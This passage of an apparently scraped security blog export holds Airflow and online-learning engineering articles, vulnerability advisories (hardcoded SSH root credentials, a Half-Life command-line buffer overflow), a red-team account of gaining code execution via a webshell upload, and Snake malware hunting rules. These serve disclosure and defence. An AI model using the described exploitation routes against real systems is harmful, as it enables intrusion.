Code Execution (CVE-2021-44031)"},"/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/":{"data":{"":"","#":"I recently worked on a project focused on log anomaly detection using manageable machine learning pipelines. The pipelines mainly include data collection — feature extraction — feature engineering — detection/prediction — updating (maintenance). It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended Airflow. In airflow, the core concept is the Directed Acyclic Graph (DAG). Through the implementation, I have confirmed that this is a truly powerful tool to manage the machine learning pipelines, instead of relying on shell scripts. But, I did encounter some challenges during the process and also, fortunately, found solutions for them. The challenges can be split into two main aspects, pipeline management and dynamic generation for tasks. Pipeline management - During the process of solving the problem about pipeline management, I met the following problems when implementing the machine learning pipelines in Airflow:\nHow to solve the dependencies within one DAG\nHow to solve the dependencies between Dags\nHow to overcome known issues with ExternalTaskSensor:\nHow to overcome issues with the execution time Dynamic generation for tasks - When I tried to integrate the pipelines with our own ELK stack, I found the problem about how to dynamically generate the tasks in a dag. This problem comes from the different log types, which include Linux, Windows, VPN and so on. I also found the same type of logs from different clients require different treatment too. The generation of tasks should be scalable and automatic. In the first place, I had many choices to make. For the operator, I can choose from the PythonOperator, BaseOperator, or BashOperator. For the dependencies, I can choose TriggerDagRunOperator, Xcom, or SubDag.\nAfter some testing, I found the most effective solution is usually the simplest, even when not 100% perfect. I chose the following combination:\nBaseOperator + DummyOperator + Plugins + Xcom + For loop + ExternalTaskSensor\n1. DummyOperator Usage DummyOperator can be used to group tasks in a DAG. In order to structure different tasks into one nice workflow, I used the DummyOperator to connect them. They won’t be executed by the executor. After introducing those two tasks, there is a common start task and a common end task to connect all middle parallel tasks.\nstart_task = DummyOperator(\ntask_id='start_task',\ndag=dag\n)\nend_task = DummyOperator(\ntask_id = 'end_task',\ndag = dag\n) PNG1：Airflow graph view\nFor the dynamic generation of tasks, I want to introduce a kind of structure to organise the code. Most of the logs share the same processing logic, so I need to introduce several automatic variables inside the tasks. The basic structure would look like the following:\n'''\n  def Dynamic_Function(variable):\n      task_1 = Function1(\n      task_id = 'task_{}'.format(variable),\n      dag = dag,\n      ...\n      )\n      return task_1\n'''\nfor variable in variables:\n  task_1 = Dynamic_Function(variable) The variables can be read it from the environment variables or just set it as a list:\n# the python way to read environment values from .env file:\nos.getenv('variables').split('') This method is not that complex, but it is quite useful when there are multiple tasks sharing the same processing logic and there is only one difference of variable in them, allowing the project to be easily scaled. 2. Plugin Operator and BaseOperator For the Function1, it is defined in a customised way in plugins/operators. You can find the detailed information on this link. The main context is shown below**:**\nfrom airflow.plugins_manager import AirflowPlugin\nfrom airflow.utils.decorators import apply_defaults\nclass MyFirstOperator(BaseOperator):    \n  @apply_defaults   \n  def __init__(self, my_operator_param, *args, **kwargs):           \n      self.operator_param = my_operator_param\n      super(MyFirstOperator, self).__init__(*args, **kwargs)    \n  def execute(self, context):       \n        ...\nclass MyFirstPlugin(AirflowPlugin):\n  name = \"my_first_plugin\"   \n  operators = [MyFirstOperator] I use it for the reason that I do not need to put all my code in the DAG. Otherwise, the DAG code would be extremely redundant and hard to manage.\nI use BaseOperator instead of PythonOperator because of the simplicity. The PythonOperator is more complex to control and needs to set more unnecessary parameters.\nWith the above two solutions, the dynamic tasks can be easily built in one DAG now. The following solutions are more for the connection and concurrency problems I met during a project. 3. Xcom \u0026 ExternalTaskSensor Now, I have to solve three key problems:\nHow to save the result for the next task? How to get the result from the last task?\nHow to make sure the result is within the right time interval?\nAirflow provides powerful solutions for those problems with Xcom and ExternalTaskSensor.\nTo save the result from the current task, Xcom is used for this requirement. It is a bit similar to git. To use it, xcom_push and xcom_pull are the main functions needed. But there is a limitation for the size, which is 48KB. Normally, you do not need to worry about the size, but it is advisable to try to save the middle variable value in xcom while not using big files. If you want to extract the result obtained from the previous DAG with a specified task combing with the dynamic tasks, the extraction process is independent and you should use the ExternalTaskSensor with the following setting:\nfor variable in variables:\n...\n  # create the task to depend on the up_stream dag\n  external_sensor = ExternalTaskSensor(\n  task_id='ext_sensor_task',\n  external_dag_id='xxx',\n  external_task_id='xxx_{}'.format(variable),\n  timeout = 300,\n  dag=dag,\n  )\n... I have to mention here, you should not use end_task in the previous DAG. If you do not want all tasks to be finished on the previous day, then go through the next day.\n4. Execution Time Execution time is kind of limited in Airflow in version 1.x. I have not tested the 2.x. In version 1.x, it does not help to change the timezone in airflow.cfg.\nBut you can use the specified way to solve the problem. The pendulum library is a really great option.\nimport pendulum\n# get the format date string\ncurrent_date = pendulum.datetime.now().strftime(\"%Y, %m, %d, %H\")\ndag = DAG(\n  dag_id = dag_id,\n  # get the datetime type value\n  start_date = pendulum.strptime(current_date, \"%Y, %m, %d, %H\").astimezone('Europe/London').subtract(hours=1),\n  default_args = default_args,\n  schedule_interval = timedelta(hours=1),\n) With this setting, you can introduce a trial task before the current time and you can make sure the time is the same as your local timezone. 5. ExternalTaskSensor Stuck Problem\nWhen people design dependent tasks in different dags, the ExternalTaskSensor is a common function to use. But if you do not follow some best practices, it can quite easily get stuck. The main problem relates to the time settings for DAGs. Among the errors that can occur, the most common is where the previous task generates a large middle value and it is impossible to transfer to an external task because of the size limitation for middle value storage. So, how to best set the time for DAGs? Based on an answer from stackoverflow: the DAGs don’t need to have the same start_date. If you create your ExternalTaskSensor task without the execution_delta or execution_date_fn, then the two DAGs need to have the same execution date. It so happens that if two DAGs have the same schedule, a scheduled task running in each interval will have the same execution date.\nThe optimal choice is to exclude execution_delta and execution_data_fn if you encounter challenges when computing the time. You should never manually trigger (in the Links column) the DAG in WebUI if the result will be sent to the next DAG. It will generate different execution dates. In practice, I defined the same start_date by setting a specific date. When I start the DAGs in Web UI, I will press all the DAG buttons at the same time if those DAGs are dependent on one other.\nPNG2：DAGs View\nThis is a very brief description of my solutions for the tricky problems I encountered. Thanks for reading!\nReferences: How do I trigger Airflow -dag using TriggerDagRunOperator - _I have found following link: https://www.linkedin.com/pulse/airflow-lesson-1-triggerdagrunoperator-siddharth-anand…_stackoverflow.com\nAirflow ExternalTaskSensor gets stuck - _I’m trying to use ExternalTaskSensor and it gets stuck at poking another DAG’s task, which has already been…_stackoverflow.com\nSensing the completion of external airflow tasks - _(Not the best title)_medium.com\nCreating a dynamic DAG using Apache Airflow - _Today we want to share with you one problem we solved by using Apache Airflow. We have a project comprising more than…_towardsdatascience.com"},"title":"Implementation and Dynamic Generation for Tasks in Apache Airflow\u003c/strong\u003e"},"/articles/2022/12/2022-12-12-online-machine-learning-how-to-integrate-user-feedback/":{"data":{"":"","choosing-a-machine-learning-method#\u003cstrong\u003eChoosing a machine learning method\u003c/strong\u003e":"","how-to-achieve-online-learning-in-airflow#\u003cstrong\u003eHow to achieve online learning in Airflow\u003c/strong\u003e:":"","how-we-structure-different-datasets#\u003cstrong\u003eHow we structure different datasets\u003c/strong\u003e:":"","practicality-and-speed-considerations-in-online-learning#\u003cstrong\u003ePracticality and speed considerations in online learning\u003c/strong\u003e:":"When designing and implementing a machine learning model, ensuring it is continually updated is a challenge that all engineers encounter. In this article, I explore the online machine learning technique that I used during a project and present how it was implemented for effective results.\nChoosing a machine learning method Machine learning solutions can be mainly split into offline and online methods. Online machine learning is a method in which data becomes available in a sequential order and is used to update the best predictor for future data at each step, as opposed to batch learning techniques which generate the best predictor by learning on the entire training data set at once. From this concept, the core components are the data in a sequential order and updating at each step. Online machine learning is necessary is based on the following reasons:\nDetection models need to be updated instantly, within a relatively short time\nComputation and storage costs need to be minimised for a large dataset\nNew types of patterns need to be integrated quickly\nUsing Apache Airflow It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended Apache Airflow. Some of the core concepts for Airflow are described below:\nDirected Acyclic Graph (DAG) – is a collection of all the tasks you want to run, organised in a way that reflects their relationships and dependencies.\nScheduler and Interval - The Airflow scheduler monitors all tasks and DAGs, then triggers the task instances once their dependencies are complete. And the interval is used to set up the time period to rerun for a dag.\nWhile using Airflow, we encountered two key challenges: No default option exists for user feedback to be provided based on the prediction result. It is vital that storage requirements are kept to a manageable level, and that the task can be completed quickly enough to enable the business process to function on-time.\nHow we structure different datasets: In order to split train and update processes, we separate training, testing, and updating. The update folder is what we use to provide corrected predictions with csv format. The format is depicted as following:\nPng1: pred and corr\nThe 1 in path_pred is the anomaly prediction. The path_corr is copied initially from path_pred and then corrected by the analyst.\nHow to achieve online learning in Airflow: In order to overcome the drawback without interactive mode in Airflow, I had to implement a custom offline solution. Thanks to the powerful automation of Airflow, I just need to set a location and input the corrected prediction result there. Then, the Airflow will read the data from the specific location as an update DAG.\nPracticality and speed considerations in online learning: As we solved the online machine learning part, we now face the problem about time consumption, and storage. As for time consumption, the prediction is made within every interval. The data is sent to the update folder to await reading by DAGs. Every prediction with the timestamp as the filename can be treated as one batch. Instead of reading and extracting the whole batch of data, I chose only the wrong prediction (after correction) and subsequently extracted the sequence (use LSTM model) from that row in csv. seq_array = df.query(“path_pred==‘1’ \u0026 path_corr in [0,‘0’]”)[‘seq_path’].values\nPng2: read single prediction sequence\nAfter splitting the sequences into multiple X and Y (number is less than the total data in a batch), I trained the model based on the chosen data, attempting to integrate the right prediction with certain attempts. for i in range(len(batch_y)):\n        # extract the predict_proba for batch_y\n        pre_proba = pred_y[i][int(np.argmax(batch_y[i]))]\n        # set the exit condition\n        success_flag = False\n        no_of_attempts = 0\n        # retrain on the single input and output\n        while pre_proba \u003c= desired_proba and (no_of_attempts\u003cattempts):\n                     \n            exec_model.fit(np.reshape(batch_x[i],(1,-1)), np.reshape(batch_y[i],(1,-1)))\n           \n            no_of_attempts += 1\n            pred_one_y = exec_model.predict_proba(np.reshape(batch_x[i],(1,-1)), verbose=2)\n            pre_proba = pred_one_y[0][int(np.argmax(batch_y[i]))]\n           \n            print(\"Attempt Number %d, Predicted Proba for this iteration %f\" %(no_of_attempts, pre_proba))\n            if pre_proba \u003e desired_proba:\n                success_flag = True\n                break\n        if (success_flag == False) and (no_of_attempts \u003e= attempts):\n            print(\"[-] Failed to incorporate this feedback\")\n        if success_flag == True:\n            print(\"[+] Feedback incorporated \\n\")\n            print(\"Took %d iterations to learn!\" %(no_of_attempts)) Png3: update based on single x and y array\nBy implementing this solution, the model can be trained much quicker and save time overall. To reduce storage requirements, every file in the update folder is unlinked after being processed. Of course, it is not possible to ensure every model will be more accurate after retraining. To manage this risk, I apply A/B testing here as well. The updated model is saved to another location and only replaces the original after performing as expected in testing.","using-apache-airflow#\u003cstrong\u003eUsing Apache Airflow\u003c/strong\u003e":""},"title":"Online Machine Learning: how to integrate user feedback"},"/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/":{"data":{"":"Software: Mutiny Network Monitoring Appliance\nAffected versions: \u003c= 7.2.0-10855\nVendor page: www.mutiny.com\nCVE Reference: CVE-2022-37832\nPublished: 16/12/2022\nCVSS 3.1 Score: 10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\nAttack Vector: Network\nCredit: Ryan Saridar\nSummary\nAn attacker can log in as root remotely to the appliance via SSH.\nMitigation\nUpgrade to version 7.2.0-10855 onwards to remediate the problem.\nTechnical details\nBefore version 7.2.0-10855, the SSH service allows password login to the appliance. The use of weak, hardcoded root credentials between versions means that an attacker with knowledge of this fixed password can log into the appliance remotely and gain unrestricted access to it. Between version 7.2.0-10788 and up to 7.2.0-10850, key-based authentication was introduced, however password-based authentication was not yet disabled. On the patched version, key-based authentication is enforced.\nTimeline\n05/08/2022: Issue reported to the vendor\n05/08/2022: Vendor acknowledged the issues\n19/08/2022: Vendor fixed the issue\n12/09/2022: CVE number assigned from MITRE\n16/12/2022: Advisory published by JUMPSEC"},"title":"\u003cstrong\u003eAdvisory CVE-2022-37832 - Mutiny Network Monitoring Appliance hardcoded credentials\u003c/strong\u003e"},"/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/":{"data":{"":"At the time of writing I am enjoying some non-billable time in the wake of a demanding engagement spanning across several months. As such, I thought it would be a good time to write up a war story from a recent project in which we came head to head against genuine and active threat actors whilst on an engagement.\nTo set the scene, I am working on a purple team project in which we are to cover both the external and internal estate. This tale comes from the external portion of the engagement and as such my colleague and I are going about our usual external red team attack methodology. During this external phase we identify several instances of servers running a software that will remain unnamed for confidentiality’s sake. I will say that this was a third-party software that is used for Identity Access Management, and it appeared to be used in several environments (pre-prod, production, etc) within the client’s estate.\nWe fingerprint the exact version of the technology in-use and find that it is in fact vulnerable and outdated. Specifically, it is vulnerable to an unrestricted file upload vulnerability. As is so often the case, metasploit had created a module for the automated exploitation of this vulnerability - great news! As this is not a covert red team, and therefore getting detected is not an issue, I attempt to exploit the file upload vulnerability using meterpreter and msfvenom. Alas, the exploit fails. Undeterred, I look to manually verify the vulnerability myself as I so often find myself doing when metasploit fails me.\nI find a proof-of-concept script on Github and read through the code. It looks good so I quickly write (steal) a JSP webshell to accompany the script and point the pair at my client’s vulnerable servers. This time, it works. With what feels like ‘too good to be true’ ease I’ve got remote code execution on the production Single Sign On (SSO) and Identity Access Management (IAM) server! As always in these cases I let the client know immediately before digging a little bit deeper.\nWhen landing on an unknown machine I want to immediately perform some situational awareness. From an external perspective this may look slightly different to internal. Some of the main questions include: What OS/distribution am I using? What user and permissions do I have? Am I domain-joined? Do I have visibility into the internal network?\nI quickly determine these answers and find that I am running as a low-privileged user, on a unix machine, that is not domain-joined. Not as juicy as I originally thought, but this is still the production SSO and IAM box so I am hopeful. At this point I get my first inclination that maybe such a trivial exploit chain may have already been abused. I run an ls to look for the existence of other webshells beyond just my own.\n[caption id=“attachment_19445” align=“aligncenter” width=“663”] Figure 1 Output of ’ls’ command[/caption]\nAs you can see it appears that I am in the site root of the server. However, what I do not see is the name of my own webshell (cmd.jsp) meaning that my file must not have been uploaded to the site root, more likely it is in the webroot.\nTo find the location of the webroot I simply use my webshell to search for the location of my webshell file name to find where all files uploaded via this exploit would land on the file system. Sure enough, I found the appearance of my webshell in a folder that we will falsely call /home/UserName/AppName/Authenticated. The natural next step is to list the contents of this directory as seen in the screenshot below.\n[caption id=“attachment_19451” align=“aligncenter” width=“265”] Figure 2 Contents of Webroot[/caption]\nWhilst this was useful, it was listing the files in alphabetical order which made it difficult to process which file could be a malicious JSP file versus one naturally used for webserver installation. I do another ls command but this time listing the contents of the directory in descending order of date modified. That helps clear things up!\n[caption id=“attachment_19452” align=“aligncenter” width=“556”] Figure 3 Contents sorted by Date Modified[/caption]\nI immediately notice the large number of files that have the exact same last modified date and time on Feb 9th. My assumption is that Feb 9th was when the webserver was installed, as all the installation files share this modification date. This leaves 8 files that have been uploaded in the 21 days since installation. The top entry (cmd.jsp) is my webshell and can be excluded. Judging by the time stamps and similar file names this still leaves several unaccounted for JSP files. Naturally, I did a cat on those files and sure enough…they were also webshells.\n[caption id=“attachment_19453” align=“aligncenter” width=“477”] Figure 4 Threat Actor Webshells[/caption]\nAt this point I know we have stumbled upon something bad. I phone the client and let them know the news whilst I continue trying to attribute some of the webshells. Due to the fact that some of the files had very similar names and were uploaded consecutively I can safely assume that they belong to the same threat actor. When grouping as such, I arrive at the conclusion that there have been 4 threat actors who have exploited this in the last 5 days!\n5 1 This is, of course, not counting any threat actors who had deleted their webshells when not in use like I had done. In the same vein, it is important to bear in mind that this was only one of several appearances of this vulnerable server in the estate.\nI reach out to the client to ask permission to repeat the same process on the other vulnerable instances, but by this point the client has engaged their Managed Detection and Response (MDR) provider who has already begun the digital forensics work of identifying the extent of the damage, whilst the client’s security team begin working on a patch. I write up a professional document containing all my findings, remediation steps, etc., and hand it over to both parties.\nLater that evening I receive an email saying that the vulnerability has been patched and, thankfully, it appears it was caught before it became too much of an issue. However, the MDR provider did see attempts to jump from the external box to the internal network, and confirmed that the box had been enrolled in a crypto mining bot network to use its resources for crypto mining. All things considered this was a pretty good outcome after the initial shock of compromising such a sensitive system.\nAnd with that quick turnaround my brief headbutt with a genuine and active threat actor(s) came to an end. It is not every day that you get findings like this but it lit the fire in me to get more exposure to the Incident Response side of things, and the client was happy we’d found and fixed a critical vulnerability in just a handful of hours. Wins all round!"},"title":"Butting Heads with a Threat Actor on an Engagement"},"/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/":{"data":{"":"Software: Half-Life\nAffected versions: Latest (\u003c= build 5433873), at the time of writing\nVendor page: www.valvesoftware.com\nCVE Reference: CVE-2023-30382\nPublished: 23/05/2023\nCVSS 3.1 Score: 8.2 AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H\nAttack Vector: Local\nCredit: Ryan Saridar\nSummary\nAn attacker can leverage a stack-based buffer overflow via Half-Life’s command line arguments to compromise the account of any local user who launches the game.\nTechnical details\nhl.exe does not adequately perform bounds checking on the command line used to launch it, allowing an attacker with control of the launch parameters to gain code execution as the user running it. By default, all users can access the C:\\Program Files (x86)\\Steam\\userdata\\\\config\\localconfig.vdf file, which can be modified to enforce a Steam application to launch with any provided command line parameters. Combining these, a low-privileged attacker can set specially crafted launch parameters using this file, and therefore gain privilege escalation when a higher privileged user runs the application.\nThe cause of the buffer overflow is found in the CCommandLine::CreateCmdLine and CCommandLine::LoadParametersFromFile functions. CreateCmdLine allocates a 4096 byte buffer which LoadParametersFromFile copies the command line to. Given that the command line is not restricted to 4096 bytes, this can lead to an overflow. This appears to have been fixed in games such as HL2 and TF2, however the fix was not applied to the original HL.\nMitigation\nValve has not responded to previous submissions of this issue, meaning the game is not patched. The simplest and most effective method of mitigation at this time is the uninstallation of Half-Life.\nThat said, there is another way of mitigating this route of attack if this isn’t an option, though it does not address the underlying buffer overflow vulnerability and thus will not cover possible alternate routes of exploitation. Your Steam installation contains globally writable configuration files that store each Steam user’s saved command line arguments (C:\\Program Files (x86)\\Steam\\userdata\\\\config\\localconfig.vdf). If a Steam user account is predominantly used by a specific local user, you can restrict writability of this file to that user account, preventing another user from being able to overwrite your command line arguments. You could also check the command line parameters via the Steam GUI before launching the game to ensure it is as expected.\nTimeline\n09/01/2021: Buffer overflow submitted for bug bounty, though rejected due to social engineering requirement\n11/01/2021: Attempt to disclose via Valve’s public security email, with no response received\n09/02/2021: Subsequent attempt to disclose, again with no response\n28/08/2022: Revisited the vulnerability and discovered the local privilege escalation route via the configuration file\n29/08/2022: Subsequent bug bounty submission, which was rejected due to claims that a remote code execution exploit of this vulnerability had been discovered and disclosed since\n04/04/2023: CVE requested and plan to publish due to lack of remediation, despite awareness of the issue\n26/04/2023: CVE assigned by MITRE\n23/05/2023: Publication by JUMPSEC"},"title":"\u003cstrong\u003eAdvisory CVE-2023-30382 – Half-Life Local Privilege Escalation\u003c/strong\u003e"},"/articles/2023/05/2023-05-26-hunting-for-snake/":{"data":{"helpful-links#Helpful Links":" CISA Advisory - https://www.cisa.gov/sites/default/files/2023-05/aa23-129a_snake_malware_1.pdf RFC 9118 - https://datatracker.ietf.org/doc/rfc9118/ Canary Tokens - https://canarytokens.org/generate Guide to setup security.exe - https://securitytxt.org/ Mitre - https://attack.mitre.org/ SigmaHQ rules - https://github.com/SigmaHQ/sigma ","host-based-detection#Host-Based Detection":"While effective, host-based detections are not without shortcomings within certain environments.\nHost-based detections enable a high degree of confidence based on the totality of positive hits for host-based artifacts, however, many artifacts on the host are easily shifted to exist in a different location, or with a different name, as the files are fully encrypted and accurately identifying these files is difficult.\nTo combat these limitations JUMPSEC advises that host-based detection is integration with further manual analysis of positive hits.\nMultiple Snake components can be detected running in the system using different Indicators of Compromise. For example, the Covert Store generated by the implant, can present the following hardcoded encryption key (not always, depending on the malware operator):\nA1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA\nAnd the same key can be retrieved from the following Windows Registry path when stored:\nSECURITY\\Policy\\Secrets\\n\nFurthermore, the following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:\nEB 52 90 4E 54 46 53 20\nEB 5B 90 4E 54 46 53 20\nEB 3C 90 4D 53 44 4F 53\nEB 00 00 00 00 00 00 00\nBy encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry and searching for a file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores.\nAnother component is the Registry Blob which might appear in the Windows registry when searching for a value of at least 0x1000 bytes in size and a High entropy value of at least 7.9. However, it can typically be found using the following information when its values are left as default:\nName: Unknown (RegBlob)\nRegistry Path: HKLM\\SOFTWARE\\Classes\\.wav\\OpenWithProgId\nCharacteristics: High Entropy\nAdditionally, Snake’s Queue File can be located leveraging a file-system search with a Regular Expression together with searching for High Entropy files using the Yara Rule listed further below. Typically the Queue File can be found with the following information:\nTypical Name: \u003c RANDOM_GUID \u003e.\u003cRANDOM_GUID\u003e.crmlog\nTypical Path: %windows\\registration\\\nUnique Characteristics: High Entropy, file attributes of hidden, system, and archive\nRole: Snake Queue File\nThe following Yara rule (named 1.yar) can be used in conjunction with the subsequently listed UNIX and PowerShell commands to detect instances of the Snake Queue FIle:\n1.yar\nrule HighEntropy { meta: description = \"entropy rule\" condition: math.entropy(0, filesize) \u003e= 7.0 } UNIX command:\nfind /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \\ '.*\\/registration/(\\{[0-9A-F]{8}\\-([0-9A-F]{4}\\-){3}[0-9A-F]{12}\\}\\.){2}crmlog' \\ -exec yara 1.yar {} \\; PowerShell command:\nGet-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object { $_.FullName -match '(?i)/registration/(\\{[0-9A-F]{8}\\-([0-9A-F]{4}\\-){3}[0-9A-F]{12}\\}\\.){2}crmlog$' } | ForEach-Object { yara 1.yar $_.FullName } Moreover, we can use the Yara rules with the last two components that might indicate the malware running on the host machine: comadmin and werfault.\nComadmin can be detected using the following information and the previously mentioned Yara rule (1.yar):\nName: comadmin.dat\nPath: %windows%\\system32\\Com\nUnique Characteristics: High Entropy\nRole: Houses Snake’s kernel driver and the driver’s loader\nLeveraging the previously stated Yara rule (1.yar) we can use the following UNI or PowerShell commands:\nUNIX\nfind /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \\ '.*\\/system32/Com/comadmin\\.dat' \\ -exec yara 1.yar {} \\; PowerShell\nGet-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object { $_.FullName -match '(?i)/system32/Com/comadmin\\.dat$' } | ForEach-Object { yara 1.yar $_.FullName } On the other end, the Werfault executable can be retrieved due to its use of non-standard icon-size and by using the information and the Yara rule stated below:\nName: Werfault.exe\nPath: %windows%\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\\\nUnique Characteristics: Icon is different than that of a valid Windows Werfault.exe file\nRole: Persistence mechanism\nrule PeIconSizes { meta: description = \"werfault rule\" condition: pe.is_pe and for any rsrc in pe.resources: (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240) and for any rsrc in pe.resources: (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384) and for any rsrc in pe.resources: (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336) } Several tools can be used for the above-mentioned rules. Often SOC/SIEM platforms offer capabilities to automate this process once a blueprint of the hunt has been developed and integrated.\nIf you currently don’t have any detection and response tooling, we recommend deploying one of the excellent open-source tools available online (we regularly use Velociraptor) to perform a hunt in your estate can integrate well with host-based hunting, allowing you to identify and respond to threats in conjunction with the techniques and rules mentioned above.","how-to-detect-snake#How to detect Snake":"There are numerous threat hunting techniques that can be deployed to detect Snake. However, depending on the type of infrastructure or response mechanisms your organisation has in place, certain techniques may prove more or less effective.\nHere are some points to consider when prioritising how to detect Snake:\nHost-Based Detection - this type of detection is critical and should be performed regardless of the size of your enterprise. It is a high confidence set of rules, which are key to determining if any of Snake’s components are located on machines connected to the network.\nNetwork based detection – these type of detection rules could be particularly useful for large scale identification of Snake communication protocols. Ideal for enterprises using intrusion detection systems or firewalls that support Suricata rules deployment.\nMemory Analysis – Another technique to identify Snake is to investigate memory and see if it is executing at known locations. The CSA provides a useful Volatility plugin to perform this analysis. Unfortunately, this is less scalable and more time consuming, however, security researchers are developing alternatives that can help automating the process at larger scale.\nOther Detection Mechanisms and Sigma Rules – Sigma rules and Yara rules are being constantly developed as we write and will help speed up and automate the process of hunting for the FSB’s malware. These can often be integrated in SOC/SIEM as well as IR tooling.\nPurple Team and Atomic Test Cases – A highly efficient way of identifying and covering the detection gaps in your estate is to utilise a purple team approach, leveraging Atomic Red Team test cases which are being developed specifically for this implant.\nJUMPSEC have detailed a number of implementable threat hunting detections which at risk organisations may wish to implement here at JUMPSEC Labs. We recommend using a combination of these approaches to effectively mitigate the threat and remove any reliance on a single point of failure.\nJUMPSEC have not exhaustively detailed each known technique. Additional hunting tools and techniques may continue to be developed and JUMPSEC is actively monitoring NCSC and CISA detections to identify opportunities where IoCs or TTPs can be leveraged.","long-term-prevention#Long-term prevention":"If you believe your organisation is at risk, JUMPSEC recommends building an Incident Response Plan and a dedicated team to monitor and effectively respond to the threats posed by Snake, in order to meaningfully utilise and validate the detection techniques outlined above.\nTo ensure that implemented detections are effective JUMPSEC recommends:\nUsing Atomic Red Team and Purple Team approaches to ingest and execute techniques used by Snake in your network to identify gaps in detection capabilities. For Purple Team Testing, security researchers at Red Canary have already started developing open-source Atomic Red Team test cases to simulate Snake which can be found here.\nActively hunting for Snake malware using endpoint and network detection tooling. Third party security providers such as JUMPSEC can assist with deployment and integration with existing detection and response platforms to monitor and prioritise critical instances of malicious activity.\nDeploying Canary Tokens in your estate where possible. Canary Tokens can serve as early warning systems as part of your organisations broader security strategy.\nEnsuring you have an adequate incident response plan that is ready to deploy. This may include baselining or reviewing existing response processes and procedures. In the event that a Snake is identified, incident response plans can be triggered, affected hosts quarantined, back-up systems deployed, and any other steps deemed necessary to secure the environment can be taken.\nAdditionally, Snake typically achieves network intrusion by exploiting vulnerable, publicly available infrastructure via targeted phishing and social engineering campaigns, meaning that organisations should rigorously review potential vulnerabilities in externally facing assets.","memory-analysis#Memory Analysis":"Memory analysis also enables a high degree of detection confidence as memory provides the greatest level of visibility into Snake’s behaviour and artifacts. However, it has the potential to impact system stability, is difficult to scale, and can be a time-consuming process.\nThe joint advisory suggests the following as the most effective approach to detect the implant on an infected host and it provides a script to be used alongside Volatility and a memory dump of the target infected machine.\n# This plugin to identify the injected usermode component of Snake is based # on the malfind plugin released with Volatility3 # # This file is Copyright 2019 Volatility Foundation and licensed under the # Volatility Software License 1.0 # which is available at https://www.volatilityfoundation.org/license/vsl-v1.0 import logging from typing import Iterable, Tuple from volatility3.framework import interfaces, symbols, exceptions, renderers from volatility3.framework.configuration import requirements from volatility3.framework.objects import utility from volatility3.framework.renderers import format_hints from volatility3.plugins.windows import pslist, vadinfo vollog = logging.getLogger(__name__) class snake(interfaces.plugins.PluginInterface): _required_framework_version = (2, 4, 0) @classmethod def get_requirements(cls): return [ requirements.ModuleRequirement(name = 'kernel', description = 'Windows kernel', architectures = [\"Intel32\", \"Intel64\"]), requirements.VersionRequirement(name = 'pslist', component = pslist.PsList, version = (2, 0, 0)), requirements.VersionRequirement(name = 'vadinfo', component = vadinfo.VadInfo, version = (2, 0, 0))] @classmethod def list_injections( cls, context: interfaces.context.ContextInterface, kernel_layer_name: str, symbol_table: str, proc: interfaces.objects.ObjectInterface) -\u003e Iterable[ Tuple[interfaces.objects.ObjectInterface, bytes]]: proc_id = \"Unknown\" try: proc_id = proc.UniqueProcessId proc_layer_name = proc.add_process_layer() except exceptions.InvalidAddressException as excp: vollog.debug(\"Process {}: invalid address {} in layer {}\". format(proc_id, excp.invalid_address, excp.layer_name)) return proc_layer = context.layers[proc_layer_name] for vad in proc.get_vad_root().traverse(): protection_string = vad.get_protection(vadinfo.VadInfo. protect_values(context, kernel_layer_name, symbol_table), vadinfo.winnt_protections) if not \"PAGE_EXECUTE_READWRITE\" in protection_string: continue if (vad.get_private_memory() == 1 and vad.get_tag() == \"VadS\") or (vad.get_private_memory() == 0 and protection_string != \"PAGE_EXECUTE_WRITECOPY\"): data = proc_layer.read(vad.get_start(), vad.get_size(), pad = True) if data.find(b'\\x4d\\x5a') != 0: continue yield vad, data def _generator(self, procs): kernel = self.context.modules[self.config['kernel']] is_32bit_arch = not symbols.symbol_table_is_64bit(self.context, kernel.symbol_table_name) for proc in procs: process_name = utility.array_to_string(proc.ImageFileName) for vad, data in self.list_injections(self.context, kernel.layer_name, kernel.symbol_table_name, proc): strings_to_find = [b'\\x25\\x73\\x23\\x31',b'\\x25\\x73\\x23\\x32', b'\\x25\\x73\\x23\\x33',b'\\x25\\x73\\x23\\x34', b'\\x2e\\x74\\x6d\\x70', b'\\x2e\\x73\\x61\\x76', b'\\x2e\\x75\\x70\\x64'] if not all(stringToFind in data for stringToFind in strings_to_find): continue yield (0, (proc.UniqueProcessId, process_name, format_hints.Hex(vad.get_start()), format_hints.Hex(vad.get_size()), vad.get_protection( vadinfo.VadInfo.protect_values(self.context, kernel.layer_name, kernel.symbol_table_name), vadinfo.winnt_protections))) return def run(self): kernel = self.context.modules[self.config['kernel']] return renderers.TreeGrid([(\"PID\", int), (\"Process\", str), (\"Address\", format_hints.Hex), (\"Length\", format_hints.Hex), (\"Protection\", str)], self._generator(pslist.PsList.list_processes( context = self.context, layer_name = kernel.layer_name, symbol_table = kernel.symbol_table_name))) Security researchers are currently developing detections and rules to speed up the memory analysis process. For example, Matt Suiche, Director of Incident Response R\u0026D at Magnet Forensics (MAGT:TO), has recently developed a YARA rule based on the above Volatility plugin to look into memory and identify snake.","mfa-and-credential-management#MFA and credential management":"As an FSB espionage tool gathering credentials for up to 20 years, JUMPSEC would additionally echo that organisations who have not already embedded standard best practice when it comes to MFA and credential management should implement appropriate measures. For example:\nChange account credentials to values which 